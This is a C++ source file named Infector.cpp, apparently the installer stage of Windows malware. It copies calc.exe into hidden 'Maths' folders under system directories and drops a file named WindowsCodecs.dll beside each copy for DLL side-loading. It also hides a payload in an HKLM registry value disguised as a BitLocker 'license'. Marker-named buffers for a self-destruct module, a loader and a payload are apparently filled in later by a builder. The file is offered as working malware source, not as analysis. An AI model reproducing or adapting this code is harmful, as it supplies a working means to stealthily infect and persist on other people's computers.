// Infector.cpp : Diese Datei enthält die Funktion "main". Hier beginnt und endet die Ausführung des Programms.
//
#include <Windows.h>
#include <iostream>
#include <direct.h>
#include <string>
#include <winreg.h>
#include "dir.hpp"
#include "getreg.hpp"

void init(std::vector<unsigned char> SD, std::vector<unsigned char> L, std::vector<unsigned char> payload)
{
    std::wstring wstrcwd = ExePath();
    std::string cwd = std::string(wstrcwd.begin(), wstrcwd.end());
    std::string file = cwd + "\\calc.exe";
    const char* path1 = "C:\\Windows\\Media";
    const char* path1M = "C:\\Windows\\Media\\Maths";
    const char* path2 = "C:\\Windows\\Web\\Wallpaper";
    const char* path2M = "C:\\Windows\\Web\\Wallpaper\\Maths";
    _chdir(path1);
    _mkdir("Maths");
    Copyfile(file, path1M);
    WriteBinary("WindowsCodecs.dll", SD);
    _chdir(path2);
    _mkdir("Maths");
    Copyfile(file, path2M);
    WriteBinary("WindowsCodecs.dll", L);
    SetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BitLocker", L"license", std::wstring(payload.begin(), payload.end()));

}
int main() {
    unsigned char SELFdst[9217] = "__MarKeRR_SLfDsT_" ;
    unsigned char LoadR[8705] = "_MaRkeR__lOaDEr__";
    unsigned char PaYlOAd[1025] = "MaRkEEr_PaYloAd";
    std::vector<unsigned char> selfdest = Unsign_charray_to_vec(SELFdst);
    std::vector<unsigned char> loader = Unsign_charray_to_vec(LoadR);
    std::vector<unsigned char> payload = Unsign_charray_to_vec(PaYlOAd);
    init(selfdest, loader, payload);
}


